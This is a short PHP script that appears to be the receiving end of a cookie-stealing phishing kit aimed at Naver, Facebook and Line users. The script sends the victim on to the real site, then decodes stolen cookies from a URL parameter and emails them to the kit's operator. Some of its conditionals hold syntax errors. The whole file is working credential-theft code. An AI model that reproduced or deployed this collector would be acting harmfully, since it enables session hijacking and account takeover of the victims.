<?php
include('Email.php');
session_start();

$site = "nava";
if($_SESSION['whom'] == 'n')
{
	$site="Nover";
	header ('Location: http://naver.com');

}else if($_SESSION['whom'] == 'f')){
		$site="Facebook";
	header ('Location: http://fb.com');
}else if($_SESSION['whom'] == 'l'))
{
		$site="Line";
	header ('Location: https://access.line.me/');
}
else if($_SESSION['whom'] == 'm'))
{
		$site="Line";
	header ('Location: http://naver.com');
}


$subject = $site.": Cookies";

	if (isset($_GET["c"]))
	{
		$cookies = base64_decode(urldecode($_GET["c"]));
		
		
		mail($To,$subject,$cookies);
	}
?>
